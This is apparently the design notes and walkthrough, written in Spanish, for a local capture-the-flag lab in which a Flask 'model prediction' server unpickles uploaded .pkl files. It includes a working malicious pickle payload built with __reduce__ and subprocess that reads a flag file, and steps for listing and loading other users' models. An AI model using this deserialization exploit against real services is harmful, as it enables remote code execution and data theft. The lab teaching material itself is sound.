FASE 1 


http://localhost:58080
Inteligencia Artificial mal protegida
Python + ML lib + Flask
-Estructura base del reto "ia_pickle" extendido con segunda flag:
	 Fase 1: RCE por deserialización
	 Fase 2: Exploración del sistema y extracción de modelos para obtener una flag secundaria
Escenario simulado
Un servidor de predicción de Machine Learning expone una funcionalidad web para:
    1. Subir archivos .pkl (modelos) formato binario de Pickle en Python
           pickle permite serializar y deserializar objetos en Python (guardarlos y cargarlos desde archivos).
Vulnerabilidad: si deserializas un archivo creado por un atacante, este puede incluir código malicioso que se ejecuta al cargarlo.
    2. Ejecutarlos para hacer "predicciones"


Descripción general del flujo (workflow)
El servidor expone dos funcionalidades principales:
    • /upload (POST): Permite a los usuarios subir un archivo .pkl, que se guarda como models/model.pkl.
    • /predict (GET): Carga el archivo models/model.pkl utilizando pickle.load() y muestra el contenido deserializado como "predicción".
    • En Python, un objeto es serializable cuando puede ser convertido a una secuencia de bytes que luego se puede guardar en un archivo o transmitir por red, y posteriormente ser reconstruido (deserializado) exactamente como era originalmente.
El servidor no ejecuta ninguna lógica de predicción de IA real, simplemente deserializa y muestra el contenido del objeto .pkl subido.
Si se quisiera hacer que el sistema hiciera predicciones reales:
    • Se debería usar una librería como joblib o sklearn para guardar y cargar modelos entrenados.
    • Debería haber una interfaz para subir datos de entrada (por ejemplo, campos de un formulario).
    • El servidor debería tener las clases de los modelos importadas para permitir la deserialización segura.





ia_pickle/
├── app.py              # Servidor Flask con endpoints vulnerables
├── requirements.txt        # Dependencias de Python
├── Dockerfile              # Imagen Docker para el servidor
├── docker-compose.yml      # Orquestador del contenedor
├── prepare.bash 		   # Genera la flag y preparar el entorno
├── start.bash              # Script para levantar el contenedor
├── stop.bash       # Script para detener y eliminar el contenedor
├── _instance  # Nombre de la instancia (generado automáticamente)
├── .env         	  # Variables de entorno, incluyendo el puerto
├── _flag.txt   	 # Flag del reto (generada automáticamente)
├── models/    		 # Carpeta donde se suben los modelos .pkl
├── templates/
    └── form.html 	# Para subir el modelo y probar la predicción
└── models/ 
    └── list_models.pkl
    └── read_flag1.pkl
    └── exec_whoami.pkl
    └── read_flag2_from_model.pkl


Este reto está montado para simular un servidor que permite a los usuarios subir sus propios modelos para luego usarlos en predicciones.
El problema es que no valida ni protege correctamente esos archivos, por lo tanto, si el atacante sube un archivo .pkl malicioso (modelo con código embebido), el servidor lo carga automáticamente y ejecuta el código malicioso.

Un escenario real donde:

    Una empresa o plataforma ofrece un servicio automático de predicciones.

    Los usuarios suben sus propios modelos .pkl para que se usen en el backend.

    El backend tiene una funcionalidad como:

        “Sube tu modelo entrenado”

        “Te lo probamos”

    Pero el backend usa pickle.load() directamente en los archivos subidos









Este reto contiene dos fases:

Fase 1: Vulnerabilidad de deserialización con Pickle
- El servidor permite subir modelos `.pkl`
- Usa `pickle.load()` sin validar
- El atacante puede ejecutar comandos en el servidor (RCE)
- La Flag1 se encuentra en `_flag.txt`

Fase 2: Acceso lateral: robo de modelos ajenos
- Hay múltiples modelos ya cargados de otros usuarios en `/models`
- El atacante puede listarlos desde su shell (`ls models/`)
- Uno de ellos (`admin_model.pkl`) contiene la Flag2 serializada
- El atacante debe hacer `pickle.load(open("models/admin_model.pkl"))` desde un shell para verla
- Flag2 se encuentra en `_flag2.txt`

Comandos de uso

bash prepare.bash      # prepara el entorno, flags y modelos
bash start.bash        # levanta el contenedor
bash stop.bash         # lo detiene


Ataque
1. Crear y subir un `.pkl` malicioso que haga `subprocess.check_output(['ls', 'models'])`
2. Observar que existe `admin_model.pkl`
3. Crear y subir otro `.pkl` que ejecute: `pickle.load(open('models/admin_model.pkl', 'rb'))`
4. Obtener la segunda flag como resultado del `__repr__`











Explotación de la vulnerabilidad (fase 1)

Crear archivo .pkl malicioso que lea la flag:

# crear_payload.py
import pickle
import subprocess

class Evil:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "_flag.txt"],))

with open("evil.pkl", "wb") as f:
    pickle.dump(Evil(), f)

print("evil.pkl creado.")

Creas el archivo mediante py (evil.pkl):

python3 crear_payload.py

 Se sube en la web y se le da a predecir


Exploración para descubrir la segunda fase



